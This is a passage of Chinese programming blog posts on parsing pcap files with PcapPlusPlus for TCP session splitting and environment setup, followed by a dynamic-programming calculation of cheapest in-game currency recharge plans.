首先是那个四元组的问题。我们说一个TCP会话是由一个元组确定的，这自然是没有错，但是在编程实现中，我把这四个元素简单地做了字符串拼接，这就带来问题了！本来 (SrcIP, DstIP, SrcPort, DstPort) 这四个元素的顺序是可以倒换的，也就是它跟 (DstIP, SrcIP, DstPort, SrcPort) 是同一个东西啊！更加具体地说，本来由 192.168.0.102 发往 1.1.1.1 的会话是双向的，也就是说 (192.168.0.102, 1.1.1.1, 4321, 443) 这么一个元组表示主机发往服务器的数据，而 (1.1.1.1, 192.168.0.102, 443, 4321) 表示的是服务器发往主机的数据，这两个元组表示的是同一个会话！而我 愚蠢地 做了字符串拼接，而且用这个拼接后的字符串来作为 map 的 key 。这种 key 表示出来的东西根本就不全啊？！会使得我们在取得一个 FIN 包时，只能找到 同向的 SYN 包，也就是说，我们整理出来的会话，只能是 由主机发起、由主机断开 或者是 由服务器发起、由服务器断开 的会话，至于 由主机发起、由服务器断开 的会话，或者 由服务器发起、由主机断开 的会话，就整理不到了。\n会话起止的问题 即便解决了元组的表示问题，还有会话起止的问题没有考虑到。\nTCP的三次握手和四次挥手中，会产生 两个SYN包、两个FIN包 ！这是我在编程过程中遗漏的知识点，反应过来之后，头痛不已……\n会话的起止，应该表示为第一个 SYN 和最后一个 FIN ，第一个 SYN 是不含 ack 的，而最后一个 FIN 是在同一个元组下出现的第二个 FIN 。\n这样的算法 不考虑超时重传的情况、不考虑最后一个 ack 的传输、不考虑连接断开之前的 2MSL 等待 。\n感觉误差挺大的样子，不过这样的误差会作用到每一个会话上，相对来说是可以接受的。\n比较成功的会话切分 在上面部分的代码宣告失败后，我翻看PCPP的 示例应用 ，意外地发现了 PcapSplitter 这个好东西，作者已经初步实现了按照会话切分 pcap 文件的功能。\n不过，作者的代码只能作为参考，因为他是将一个大的 pcap 文件按照一定规则切分为若干小的 pcap 文件，跟我的主要需求不太一致。\n当我阅读 ConnectionSplitter.h 这个文件时，发现了一个重要的函数： hash5Tuple() 。\n有没有搞错？！搞了大半天的用四元组来表示一个会话，结果这个库自己就能够处理元组哈希？而且参数简单得要死，传入一个 parsedPacket 即可。\n行叭，就用这个函数来替代之前的愚蠢的元组表示方式，同时完善一下会话起止的判定方法，改写一下会话切分代码：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;TcpLayer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;PacketUtils.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;ctime\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace pcpp; using namespace std; #define MY_FORMAT setw(18) \u0026lt;\u0026lt; setiosflags(ios::left) IFileReaderDevice* openFileReader(string fileName) { IFileReaderDevice* openedReader = IFileReaderDevice::getReader(fileName); if (!openedReader) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } if (!openedReader-\u0026gt;open()) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } return openedReader; } int main(int argc, char* argv[]) { // open a pcap file for reading string pcapFile = \u0026#34;test_file_1.pcap\u0026#34;; IFileReaderDevice* reader = openFileReader(pcapFile); if (!reader-\u0026gt;setFilter(\u0026#34;tcp\u0026#34;)) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } RawPacket rawPacket; map\u0026lt;uint32_t, timespec\u0026gt; sessionMap; map\u0026lt;uint32_t, int\u0026gt; finCount; int outputCount = 0; auto BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { Packet parsedPakcet(\u0026amp;rawPacket); TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); uint32_t keyTuple = hash5Tuple(\u0026amp;parsedPakcet); if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag == 1 \u0026amp;\u0026amp; tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;ackFlag == 0) { sessionMap[keyTuple] = rawPacket.getPacketTimeStamp(); } if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;finFlag == 1 || tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;rstFlag == 1) { if (finCount.find(keyTuple) != finCount.end()) { finCount[keyTuple]++; } else { finCount[keyTuple] = 1; } auto sessionStart = sessionMap.find(keyTuple); if (finCount[keyTuple] == 2 \u0026amp;\u0026amp; sessionStart != sessionMap.end()) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Src\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Dst\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;SrcPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;DstPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Start\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;End\u0026#34;\u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Duration\u0026#34; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; ipLayer-\u0026gt;getSrcIPv4Address().toString() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; ipLayer-\u0026gt;getDstIPv4Address().toString() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; tcpLayer-\u0026gt;getSrcPort() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; tcpLayer-\u0026gt;getDstPort(); double startTime = sessionStart-\u0026gt;second.tv_sec + (double)sessionStart-\u0026gt;second.tv_nsec / 1e9; double endTime = rawPacket.getPacketTimeStamp().tv_sec + (double)rawPacket.getPacketTimeStamp().tv_nsec / 1e9; cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; sessionStart-\u0026gt;second.tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; rawPacket.getPacketTimeStamp().tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; setprecision(5) \u0026lt;\u0026lt; (endTime - startTime) \u0026lt;\u0026lt; endl; sessionMap.erase(sessionStart); outputCount++; } } } auto END = clock(); cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Total sessions: \u0026#34; \u0026lt;\u0026lt; outputCount \u0026lt;\u0026lt; endl; reader-\u0026gt;close(); delete reader; return 0; } 这次代码作出的改变主要有：\n使用 uint32_t keyTuple = hash5Tuple(\u0026amp;parsedPakcet); 来表示会话元组，既节省空间（原先的 String 超级大）又节省时间（把 String 当做键值，比较起来很慢）； 重新考虑会话起止的算法。会话起点为带有 SYN 但不带 ack 的包，会话终点为第二个 FIN 包；在后期观察时，发现 会话终点还可以是 RST 包 。 运行结果 结果不坏。从时间上看，基本上比之前的切分方式快了一倍。\n与WireShark统计结果的对比 程序计算出来的结果是 163 个完整会话，而WireShark的统计结果是 221 个会话：\nWireShark–Statistics–Conversations 但是将这些会话按照字节大小排序，跟踪前面的比较小的会话，发现这些会话并不完整：\n不完整的会话 我推测WireShark仅仅是根据五元组来进行统计，根本没有去考虑会话的完整性。如果我们使用 hash5Tuple() ，计算出来的每一个 uint_32 值都表示一个会话，那么结果跟WireShark的统计应该是一样的。\n简单在代码中添加一个记录这些五元组的集合 set\u0026lt;uint32_t\u0026gt; tupleSet; ，然后每计算一个哈希值就往里放，最后打印一下：\ntupleSet.size() 果不其然！\nWireShark这种统计方式没什么用啦！一个没头没尾的数据段能代表什么呢？还是按照之前提到的方法来表示一个会话，这样精确一点！\n参考资料 [1] 4. Packet Parsing - PcapPlusPlus\n[2] 1. Introduction - PcapPlusPlus\n[3] PcapPlusPlus: API Documentation\n[4] 一站式学习Wireshark（七）：Statistics统计工具功能详解与应用 - zhuimeng~ - 博客园 (cnblogs.com)\n[5] PcapPlusPlus/Examples/PcapSplitter at master · seladb/PcapPlusPlus (github.com)\n","date":"2022-02-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/pcapplusplus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95%E4%BA%8C%E9%80%9A%E8%BF%87%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E5%8C%85%E5%AE%9E%E7%8E%B0%E4%BC%9A%E8%AF%9D%E5%88%86%E5%89%B2/","title":"PcapPlusPlus使用记录（二、通过解析数据包实现会话分割）"},{"content":"简介 由于项目的需要，近期产生了一个需求：将一个 pacp 文件解析出来，然后尝试提取每个连接的各种统计数据，例如提取一个完整的TCP会话中的源IP、目的IP、源端口、目的端口、会话开始时间、会话结束时间、发送的数据包数量、发送的数据包总大小等等。\n能够实现这一需求的库有很多，如python中的 scapy 、 dpkt ，C++中的 PcapPlusPlus 等，考虑到将来可能需要处理较大的 pcap 文件，以及C++相比于python在执行速度上的优势，我决定使用C++作为流量处理的语言；简单翻阅了一下 PcapPlusPlus的文档 ，我认为这个库的易用性能够满足我较低的水平，因此决定先实践一下再说。\n预装依赖 从这里开始，我想将 PcapPlusPlus 简称为 PCPP ，方便文章的撰写之用 。\n本文使用的环境是：Win10 + VisualStudio2019 。\n要使用这个库，我们需要先安装一些依赖。\n个人建议将这些依赖下载到同一个地方，方便管理！\n安装 WinPcap开发者工具 或 Npcap SDK 。下载解压而已，很简单！我这边使用的是WinPcap 。 安装 pthread-win32工具 ，注意这里的链接跟PCPP文档里面的链接是不一样的！文档里面的URL协议是 ftp ，我下载的时候好像打不开的样子，就改为使用 https 了！ 可能还需要一个 Microsoft Visual C++ Redistributable 工具，从这里下下来的是个 exe 文件，我在后面的过程中 暂时没有用到 ！也就是说我还没运行过这个EXE，先下载下来而已！ 下载PcapPlusPlus 直接从 PcapPlusPlus v21.11 页面上把示例代码下载下来！我这边选用的是 windows-vs2019 这个压缩包！\n到这一步，算上我们之前下载 并解压 的依赖，文件夹里面应该有这么多东西：\n现有的文件 All right？进入刚才下载的VS2019文件夹里面，有个 ExampleProject ，打开之：\nExampleProject文件结构 没问题的话，就准备运行示例程序了！\n运行示例程序 熟悉VS的朋友可能要迫不及待地把那个 .sln 文件给打开了~不要心急！\n首先我们应该修改 .props 文件，这个文件是用来指定项目里面的一些属性的；具体地说，其实就是指定刚才下载的几个依赖的路径而已！如果不修改这个文件，贸然打开 .sln ，那必然是要报错的！\n最原始的 .props 文件内容如下：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Project ToolsVersion=\u0026#34;4.0\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/developer/msbuild/2003\u0026#34;\u0026gt; \u0026lt;ImportGroup Label=\u0026#34;PropertySheets\u0026#34; /\u0026gt; \u0026lt;PropertyGroup Label=\u0026#34;UserMacros\u0026#34;\u0026gt; \u0026lt;PcapPlusPlusHome\u0026gt;Drive:\\your\\PcapPlusPlus\\folder\u0026lt;/PcapPlusPlusHome\u0026gt; \u0026lt;PcapSdkHome\u0026gt;Drive:\\WpdPack\\folder\u0026lt;/PcapSdkHome\u0026gt; \u0026lt;PThreadWin32Home\u0026gt;Drive:\\pthread-win32\\folder\u0026lt;/PThreadWin32Home\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;PropertyGroup /\u0026gt; \u0026lt;ItemDefinitionGroup /\u0026gt; \u0026lt;ItemGroup /\u0026gt; \u0026lt;/Project\u0026gt; 看到吗？这个文件指定三个关键路径：\nPcapPlusPlusHome ：就是刚才解压出来的PCPP目录，也就是现在这个 ExampleProject 的上级目录！ PcapSdkHome ：用于处理 pcap 文件的SDK工具的目录，在 预装依赖 小节里面我们下载了WinPcap，还记得吗？把它的路径写在这里即可！如果你选用的是Npcap，道理也一样~ PThreadWin32Home ：多线程库！把pthread路径填进去吧 😀 在我的PC上，修改完成之后这个文件差不多是这样：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Project ToolsVersion=\u0026#34;4.0\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/developer/msbuild/2003\u0026#34;\u0026gt; \u0026lt;ImportGroup Label=\u0026#34;PropertySheets\u0026#34; /\u0026gt; \u0026lt;PropertyGroup Label=\u0026#34;UserMacros\u0026#34;\u0026gt; \u0026lt;PcapPlusPlusHome\u0026gt;E:\\PcapPlusPlus\\pcapplusplus-21.11-windows-vs2019\u0026lt;/PcapPlusPlusHome\u0026gt; \u0026lt;PcapSdkHome\u0026gt;E:\\PcapPlusPlus\\WpdPack\u0026lt;/PcapSdkHome\u0026gt; \u0026lt;PThreadWin32Home\u0026gt;E:\\PcapPlusPlus\\pthreads-w32-2-9-1-release\u0026lt;/PThreadWin32Home\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;PropertyGroup /\u0026gt; \u0026lt;ItemDefinitionGroup /\u0026gt; \u0026lt;ItemGroup /\u0026gt; \u0026lt;/Project\u0026gt; 之后，就可以打开 .sln 文件了！示例项目即刻出现！\nmain.cpp 简单使用PcapPlusPlus解析了一下示例项目里面的 1_packet.pcap 文件，这个文件只有一个数据包，程序把源IP和目的IP输出了一下而已！\n直接编译运行即可：\n运行结果 简单使用PCPP处理pcap文件 刚才运行的示例未免太简单，很难体现出咱们这个库的潜力！\n在这一小节，我希望使用这个库简单处理一下我之前捕获的一个 pcap 文件，里面包含两万多条数据，其实也还不算很大。\ntest_file_1.pcap 先把代码贴出来，再慢慢解释吧~\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;ctime\u0026gt; int main(int argc, char* argv[]) { // Part 1 // open a pcap file for reading pcpp::IFileReaderDevice* reader = pcpp::IFileReaderDevice::getReader(\u0026#34;test_file_1.pcap\u0026#34;); if (!reader) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } if (!reader-\u0026gt;open()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Part 2 if (!reader-\u0026gt;setFilter(\u0026#34;tcp and port 80\u0026#34;)) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Part 3 pcpp::RawPacket rawPacket; std::set\u0026lt;std::string\u0026gt; dstIPSet; clock_t BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { pcpp::Packet parsedPacket(\u0026amp;rawPacket); if (parsedPacket.isPacketOfType(pcpp::IPv4)) { pcpp::IPv4Address dstIP = parsedPacket.getLayerOfType\u0026lt;pcpp::IPv4Layer\u0026gt;()-\u0026gt;getDstIPv4Address(); if (dstIPSet.count(dstIP.toString()) == 0) dstIPSet.insert(dstIP.toString()); } } clock_t END = clock(); // Part 4 std::cout \u0026lt;\u0026lt; \u0026#34;There are total \u0026#34; \u0026lt;\u0026lt; dstIPSet.size() \u0026lt;\u0026lt; \u0026#34; destination IP address.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34; ms.\\n\u0026#34;; // Part 5 reader-\u0026gt;close(); delete reader; return 0; } 根据 参考资料[4] ，我们这次使用的 reader 跟刚才示例代码使用的不太一样，用的是 IFileReaderDevice 里面的 getReader() API，它会根据文件名来为我们返回合适的Reader！代码里面的 Part 1 就是在干这个事情而已，创建一个合适的Reader，然后打开它，准备读取文件了！\n紧接着，我为这个Reader设置了一个过滤器。 reader-\u0026gt;setFilter(\u0026quot;tcp and port 80\u0026quot;) 表明我只希望读取协议为TCP的、且端口为 80 的数据包，其它的数据包（如ICMP、UDP等等）我就不关心了。这个 setFilter 在将来的场景里面应该是蛮有用的，它使用的是 Berkeley Packet Filter (BPF) syntax 。\n来到 Part 3 之后，开始分析我们读到的数据。过滤器是TCP协议和 80 端口，其实我们读取的就是发往某个Web服务的请求而已！我用了一个集合 dstIPSet 来记录目的IP，打算待会看看总共有多少不同的目的主机 😹 使用 while 循环来读取数据包，使用 parsedPacket 来解析数据包，然后获取数据包里面的IPv4地址，把它放到集合里面！\nPart 3 有个小点缀，就是在循环外面设置了两个 clock_t ，目的是测试一下整个循环要花多长时间！\nPart 4 就是我们的输出啦：\noutput result Part 5 还是比较重要的，要把劳苦功高的Reader关掉、还要释放它的空间啊！刚开始编写这个程序的时候我给忘了，罪过罪过~由于PCPP的这个 IFileReaderDevice 是动态分配的，如果不把它 delete 掉的话会发生内存泄露呀！\n参考资料 [1] Quick Start - Visual Studio - PcapPlusPlus\n[2] Build on Windows (VS) - PcapPlusPlus\n[3] 《PCAP》第1期（1）：PcapPlusPlus示例程序VS2015配置 - 知乎 (zhihu.com)\n[4] 2. Read/Write Pcap Files - PcapPlusPlus\n","date":"2022-02-05T00:00:00Z","permalink":"https://xrg.fj.cn/p/pcapplusplus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95%E4%B8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","title":"PcapPlusPlus使用记录（一、环境搭建\u0026简单使用）"},{"content":"整活简介 今天是农历除夕，王者荣耀一年一度的 割韭菜 年限皮肤又上场了。\n打开游戏，进入充值页面，开冲！\n嗯？等等，好像要破费？！\n虽然APP Store有充值赠送机制，但当我需要的目标数额多起来时，怎么获取最优化的充值方案呢？似乎是个有趣的问题 😼\n所谓 最优化的充值方案 ，即是指两种情况：\n花费最少的钱，获取目标数额的点券； 在一定量的花销下，获取最多的点券。 这两种情景不一样哈！第一个是在满足购买需求的情况下尽可能少地花钱！第二个是在预算有限的情况下尽可能多地买到点券！\nAPP Store充值方案 场景一、购买一定点券，计算最少花销 场景一就是当我们需要一定数量的点券时，计算最少的花销是多少！这个场景很有意义！因为在充钱的时候，大多数情况就是这个场景！我们不会去考虑这次要冲多少钱，而是首先考虑这次要买的是什么东西。\n既然文章标题都已经点明了我的用意，那就直接从DP的角度开始思考了 😏\n令 dp[i] 表示 购买 i 点券的最少花销 ，那么对于目标点券 i ，它可以由上图中所有可能的方案组成。例如我们需要购买 1430 点券，那么我们可以花费若干个 1￥ 购买若干份 10点券 ，也可以花费两个 68￥ 购买两份 715(680+35)点券 。唯一的限制是，不能使用比 i 更大的购买方案，例如我们需要 1430 点券，那就不能花费 648￥ 去买到六千多点券，不然就很浪费！\n既然要使用DP，那么我们得到的状态转移方程应该是什么呢？\n这是个很简单的问题！假如我们使用的购买方案是 m ， cost[m] 表示使用 m 号购买方案 花费的RMB ，gain[m] 表示使用 m 号购买方案 获得的点券 ，而 dp[i] 仍然是 购买 i 点券的最少花销 ，那么： $$ dp[i] = min(dp[i], dp[i - gain[m]] + cost[m]) $$ 其实就是：假如我们选择了方案 m ，获得了gain[m] 的点券，花掉了 cost[m] 的钱，还要继续获得 i - gain[m] 的点券，这个 i - gain[m] 点券的最少花销应该是此前已经计算过的了！那么总的花销就是 dp[i - gain[m]] + cost[m] 啦！\n我们要考虑的是最优的方案，只要要把所有符合条件的方案 m 循环一遍即可。\n根据以上的分析，开始真正的DP过程，需要注意的是：\n可以看到APP Store里面所有的购买方案中，即便考虑了赠送的点券，获取到的点券也都是 5 的倍数。 目标点券有可能无法恰好获取，此时必须容许一定程度的 上溢 ，例如我只希望购买 888 点券，但这个数额不是 5 的倍数，因此我可能需要购买 890 的点券。 void minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { dp[i] = min(dp[i], dp[i - gain[m]] + cost[m]); m++; } } printResultByTargetPoints(dp, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, int targetPoints) { int i = targetPoints; // 首先要找到第一个可用的方案 while (dp[i] == DP_MAX) i++; // 之后开始打印上溢 60 点券之内的方案 while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; \u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; i += 5; } return ; } 在上面这部分代码中，有几个细节：\n允许上溢 60 点券，即我本来可能需要买 220 点券，但可以计算到购买 280 点券的最优解； 因为能买到的点券额度一定是 5 的倍数，因此DP时直接将 i += 5 ； 对于 无解 的情况，例如购买 13 个点券这种情况， dp[13] 一定等于原始的 DP_MAX ，这种情况正如此前所说，要发生 上溢 ，也就是在输出答案的时候先把 i 一直往上增加，直到 dp[i] != DP_MAX 为止！ 直接尝试执行一下！\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { minCostToGetTargetPoints(2140); } /* 执行完成，耗时：0 ms Cost 202 yuan to get 2140 points. Cost 204 yuan to get 2145 points. Cost 203 yuan to get 2150 points. Cost 205 yuan to get 2155 points. Cost 204 yuan to get 2160 points. Cost 206 yuan to get 2165 points. Cost 205 yuan to get 2170 points. Cost 207 yuan to get 2175 points. Cost 206 yuan to get 2180 points. Cost 208 yuan to get 2185 points. Cost 207 yuan to get 2190 points. Cost 209 yuan to get 2195 points. Cost 208 yuan to get 2200 points. */ 难受了！这是什么输出啊？？我只知道要获得目标点券最少需要多少元，但是程序没告诉我具体的充值方案！\n看来需要一个额外的变量来告诉我最近的一次充值是多少数额，然后我逐渐往回递推，获得总的充值方案。\n新增一个小功能，要额外花费不少代码行：\nvoid minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); vector\u0026lt;int\u0026gt; lastTopup(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { if (dp[i] \u0026gt;= dp[i - gain[m]] + cost[m]) { dp[i] = dp[i - gain[m]] + cost[m]; // 新增：保存一下最后一次充值购买的方案 lastTopup[i] = m; } m++; } } printResultByTargetPoints(dp, lastTopup, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints) { int i = targetPoints; // 首先要找到第一个可用的方案 while (dp[i] == DP_MAX) i++; // 之后开始打印上溢 60 点券之内的方案 while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; \u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is : \\n\\tcost(￥)\\tpoints\\n\u0026#34;; for (int tmp = i; tmp \u0026gt; 0; ) { int m = lastTopup[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= gain[m]; } i += 5; } } 执行一下！\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { minCostToGetTargetPoints(2140); } /* 执行完成，耗时：0 ms Cost 202 yuan to get 2140 points. The method is : cost(￥) points 198 2100 1 10 1 10 1 10 1 10 Cost 204 yuan to get 2145 points. The method is : cost(￥) points 68 715 68 715 68 715 Cost 203 yuan to get 2150 points. The method is : cost(￥) points 198 2100 1 10 1 10 1 10 1 10 1 10 Cost 205 yuan to get 2155 points. The method is : cost(￥) points 68 715 68 715 68 715 1 10 Cost 204 yuan to get 2160 points. The method is : cost(￥) points 198 2100 6 60 ======= 此处省略若干行 ======= */ 从上面这个例子的输出可以看到：同样的 204￥ ，有的方案可以买到 2145 点券，而有的能买到 2160 点券！差了一块多！因此我们不能只打印目标点券的最优解，往上多打印几个，可能发现用相同的钱可以买到更多点券，何乐不为呢 😹\n场景二、固定一定花销，购买最多点券 场景一是比较常见的，至于场景二，手头比较拮据的时候用吧！\n这个场景就是个典型的 完全背包问题 而已：令 dp[j] 表示花费 j 元钱能买到的最多点券，那么对于所有可行的方案 m ，转移方程就是： $$ dp[i] = max(dp[i], dp[i - cost[m]] + gain[m]) $$ 其实两个场景思路差不多，直接上代码！\nvoid maxPointsByMaxCost(int maxCost) { int j = 0; vector\u0026lt;int\u0026gt; dp(maxCost + 1, 0); vector\u0026lt;int\u0026gt; lastPurchase(maxCost + 1, 0); for (j = 0; j \u0026lt;= maxCost; j++) { int m = 0; while (cost[m] \u0026lt;= j) { if (dp[j] \u0026lt;= dp[j - cost[m]] + gain[m]) { dp[j] = dp[j - cost[m]] + gain[m]; lastPurchase[j] = m; } m++; } } printResultByMaxCost(dp, lastPurchase, maxCost); return ; } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost) { cout \u0026lt;\u0026lt; \u0026#34;You can get \u0026#34; \u0026lt;\u0026lt; dp[maxCost] \u0026lt;\u0026lt; \u0026#34; points using \u0026#34; \u0026lt;\u0026lt; maxCost \u0026lt;\u0026lt; \u0026#34; yuan.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is: \\n\\tCost(￥)\\tPoints\\n\u0026#34;; for (int tmp = maxCost; tmp \u0026gt; 0; ) { int m = lastPurchase[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= cost[m]; } return ; } 执行一下：\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { // minCostToGetTargetPoints(2135); maxPointsByMaxCost(499); maxPointsByMaxCost(200); maxPointsByMaxCost(20); } /* 执行完成，耗时：0 ms You can get 5280 points using 499 yuan. The method is: Cost(￥) Points 198 2100 198 2100 45 475 45 475 6 60 6 60 1 10 You can get 2120 points using 200 yuan. The method is: Cost(￥) Points 198 2100 1 10 1 10 You can get 200 points using 20 yuan. The method is: Cost(￥) Points 6 60 6 60 6 60 1 10 1 10 */ 总的代码 #define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints); void minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); vector\u0026lt;int\u0026gt; lastTopup(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { if (dp[i] \u0026gt;= dp[i - gain[m]] + cost[m]) { dp[i] = dp[i - gain[m]] + cost[m]; // 新增：保存一下最后一次充值购买的方案 lastTopup[i] = m; } m++; } } printResultByTargetPoints(dp, lastTopup, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints) { int i = targetPoints; // 首先要找到第一个可用的方案 while (dp[i] == DP_MAX) i++; // 之后开始打印上溢 60 点券之内的方案 while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; 